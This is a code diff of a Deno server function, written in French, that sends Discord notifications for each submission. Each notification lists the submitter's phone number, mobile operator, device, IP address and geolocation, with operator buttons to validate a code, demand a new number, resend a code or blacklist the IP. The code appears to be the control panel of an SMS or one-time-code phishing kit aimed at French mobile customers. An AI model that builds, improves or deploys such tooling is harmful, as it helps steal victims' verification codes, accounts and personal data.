@@ -41,17 +41,6 @@ Deno.serve(async (req) => {
   });
 
   const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
-  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
-
-  // These links call triggerSendCode with the action param
-  const validUrl   = `${appUrl}/?triggerAction=valid&id=${submissionId}`;
-  const wrongUrl   = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
-  const expiredUrl = `${appUrl}/?triggerAction=expired&id=${submissionId}`;
-
-  // Create a simple blacklist URL with base64 encoding
-  const blacklistPayload = btoa(JSON.stringify({ ip, telephone, submissionId }));
-  const blacklistUrl = `${appUrl}/api/blacklist?data=${blacklistPayload}`;
-
   const geoResponse = await fetch("https://ipapi.co/" + ip + "/json/").catch(() => null);
   let geoData = { country_name: "France", city: "Inconnue" };
   if (geoResponse?.ok) {
@@ -75,17 +64,22 @@ Deno.serve(async (req) => {
       { name: "💾 Appareil", value: device, inline: true },
       { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: true },
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
-      {
-        name: "Actions",
-        value: `✅ [**Valider le code**](${validUrl})\n❌ [**Changer le numéro**](${wrongUrl})\n⏰ [**Renvoyer au code**](${expiredUrl})\n🚫 [**Instant Blacklist**](${blacklistUrl})`,
-        inline: false
-      },
     ],
     footer: { text: `ID: ${submissionId || "N/A"}` },
     timestamp: now.toISOString(),
   };
 
-  await sendBotMessage({ embeds: [embed] });
+  const components = [{
+    type: 1,
+    components: [
+      { type: 2, style: 3, label: "✅ Valider le code", custom_id: `action:valid:${submissionId}` },
+      { type: 2, style: 4, label: "❌ Changer le numéro", custom_id: `action:wrong:${submissionId}` },
+      { type: 2, style: 1, label: "⏰ Renvoyer au code", custom_id: `action:expired:${submissionId}` },
+      { type: 2, style: 4, label: "🚫 Instant Blacklist", custom_id: `action:blacklist:${submissionId}:${ip}` },
+    ]
+  }];
+
+  await sendBotMessage({ embeds: [embed], components });
 
   return Response.json({ ok: true });
 });
